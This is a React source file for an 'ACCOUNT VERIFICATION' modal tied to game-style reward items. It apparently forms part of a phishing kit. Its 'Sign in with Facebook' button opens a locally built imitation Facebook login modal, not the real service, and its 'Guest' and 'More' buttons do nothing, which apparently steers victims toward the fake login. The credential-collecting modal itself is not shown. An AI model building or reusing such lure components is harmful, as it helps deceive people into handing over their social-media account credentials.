import { useState } from 'react';
import { X } from 'lucide-react';
import FacebookLoginModal from './FacebookLoginModal';

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

interface AccessModalProps {
  isOpen: boolean;
  onClose: () => void;
  item: RewardItem | null;
}

const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
  const [showFacebookLogin, setShowFacebookLogin] = useState(false);

  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  const handleFacebookLogin = () => {
    setShowFacebookLogin(true);
  };

  const handleCloseFacebookLogin = () => {
    setShowFacebookLogin(false);
  };

  if (!isOpen) return null;

  return (
    <>
      <div
        className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm"
        onClick={handleBackdropClick}
      >
        <div className="relative w-[90%] max-w-md aspect-[16/9] bg-black rounded-lg shadow-2xl overflow-hidden">

          {/* Topbar */}
          <div className="absolute top-0 left-0 w-full flex justify-between items-center px-3 py-1 z-20 bg-white/80 backdrop-blur-sm">
            <h2 className="text-xs font-semibold text-gray-800">ACCOUNT VERIFICATION</h2>
            <button onClick={onClose}>
              <X className="w-4 h-4 text-gray-500 hover:text-black" />
            </button>
          </div>

          {/* Background Video (touch-proof) */}
          <div className="absolute top-0 left-0 w-full h-full z-10 pointer-events-none">
            <iframe
              src="https://streamable.com/e/9d8j5m?autoplay=1&muted=1&nocontrols=1"
              allow="fullscreen;autoplay"
              allowFullScreen
              className="w-full h-full"
            />
          </div>

          {/* Buttons */}
          <div className="absolute bottom-3 left-1/2 transform -translate-x-1/2 z-20 w-full px-3 flex flex-col items-center gap-1.5">
            <button
              onClick={handleFacebookLogin}
              className="w-[65%] bg-[#1877f2] text-white px-2 py-[4px] rounded-md shadow-md hover:bg-[#145dcc] text-[11px] font-semibold"
            >
              Sign in with Facebook
            </button>
            <div className="flex w-[65%] justify-between gap-1">
              <button className="flex-1 bg-white/90 border border-gray-400 text-black py-[4px] rounded-md shadow text-[10px] font-semibold">
                👤 Guest
              </button>
              <button className="flex-1 bg-white/90 border border-gray-400 text-black py-[4px] rounded-md shadow text-[10px] font-semibold">
                ••• More
              </button>
            </div>
          </div>

        </div>
      </div>

      {/* Facebook Modal */}
      <FacebookLoginModal
        isOpen={showFacebookLogin}
        onClose={handleCloseFacebookLogin}
      />
    </>
  );
};

export default AccessModal;
            
